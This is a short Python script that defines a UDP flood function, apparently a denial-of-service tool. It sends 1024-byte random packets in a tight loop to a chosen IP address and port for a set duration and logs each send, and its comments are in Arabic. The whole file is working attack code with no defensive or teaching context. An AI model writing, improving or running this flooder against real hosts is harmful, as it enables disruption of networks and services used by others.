import socket
import random
import time

def udp_flood(target_ip, target_port, duration):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    packet_size = 1024  # حجم الحزمة بالبايت
    packet = random._urandom(packet_size)  # حزمة عشوائية

    timeout = time.time() + duration
    print(f"[UDP] Flooding {target_ip}:{target_port} for {duration} seconds")

    while time.time() < timeout:
        try:
            sock.sendto(packet, (target_ip, target_port))
            print(f"[UDP] Packet sent to {target_ip}:{target_port}")
        except Exception as e:
            print(f"[UDP] Error sending packet: {e}")
